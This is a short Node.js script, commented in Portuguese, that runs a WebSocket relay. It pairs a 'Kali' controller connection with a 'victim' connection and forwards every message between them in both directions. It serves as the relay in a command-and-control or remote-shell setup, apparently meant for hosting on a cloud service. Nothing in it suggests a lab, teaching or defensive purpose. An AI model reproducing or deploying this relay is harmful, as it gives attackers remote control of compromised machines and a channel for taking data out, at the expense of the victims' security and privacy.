const WebSocket = require('ws');
const http = require('http');
const server = http.createServer();
const wss = new WebSocket.Server({ server });

let kali = null;
let victim = null;

wss.on('connection', (ws, req) => {
    // Identifica quem está conectando pela URL
    const type = req.url; 

    if (type === '/kali') {
        kali = ws;
        console.log("Controlador Kali conectado.");
    } else {
        victim = ws;
        console.log("Vítima conectada.");
        
        // Ponte: Tudo que a Vítima manda, vai para o Kali
        victim.on('message', (data) => {
            if (kali && kali.readyState === WebSocket.OPEN) {
                kali.send(data);
            }
        });
    }

    // Ponte: Tudo que o Kali manda, vai para a Vítima
    ws.on('message', (data) => {
        if (ws === kali && victim && victim.readyState === WebSocket.OPEN) {
            victim.send(data);
        }
    });

    ws.on('close', () => {
        if (ws === kali) kali = null;
        if (ws === victim) victim = null;
    });
});

server.listen(process.env.PORT || 10000);
